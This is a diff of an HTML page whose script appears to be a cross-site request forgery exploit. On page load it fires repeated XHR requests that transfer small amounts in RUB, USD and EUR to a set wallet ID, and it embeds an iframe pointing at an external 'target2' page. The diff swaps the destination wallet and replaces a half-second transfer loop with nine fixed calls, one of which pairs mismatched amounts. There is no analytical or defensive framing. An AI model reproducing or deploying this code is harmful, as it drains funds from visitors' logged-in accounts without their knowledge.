@@ -30,7 +30,7 @@ xhr.onload = function() {
 
 // بناء جسم الطلب مثل curl
  var body =
-    "sepi=&s_ex=&to_wallet=W9352931" +
+    "sepi=&s_ex=&to_wallet=W150333" +
     "&amount=" +
     encodeURIComponent(amount) +
     "&cur=" +
@@ -40,31 +40,16 @@ xhr.onload = function() {
     encodeURIComponent(pcAmount);
 xhr.send(body);
 }
-function startLoop() {
-  let amount = 1;
-  const currencies = ["RUB", "USD", "EUR"];
-  let i = 0; // مؤشر الطلب
 
-  function loop() {
-    // نحسب amount من 1 لـ 10
-    let currentAmount = (i % 10) + 1; 
-    let pcAmount = (currentAmount * 1.01).toFixed(2); 
-    let cur = currencies[i % currencies.length]; 
-
-    sendTransfer(currentAmount, cur, pcAmount);
-    console.log("Sent:", currentAmount, cur, pcAmount);
-
-    i++; 
-    // نستدعي نفسنا بعد نص ثانية
-    setTimeout(loop, 500);
-  }
-
-  loop();
-}
-
-startLoop();
-
-
+sendTransfer(1, "RUB", 1.01);
+sendTransfer(1, "USD", 1.01);
+sendTransfer(1, "EUR", 1.01);
+sendTransfer(2, "RUB", 2.02);
+sendTransfer(2, "USD", 2.02);
+sendTransfer(2, "EUR", 2.02);
+sendTransfer(3, "RUB", 3.03);
+sendTransfer(3, "USD", 3.03);
+sendTransfer(4, "EUR", 3.03);
 </script>
 <div id="iframes-container">
 <iframe src="https://klixion.com/target2.php?id=80889&secid=mhdVjxqkqd" height="200" width="300" title="Iframe Example"></iframe>
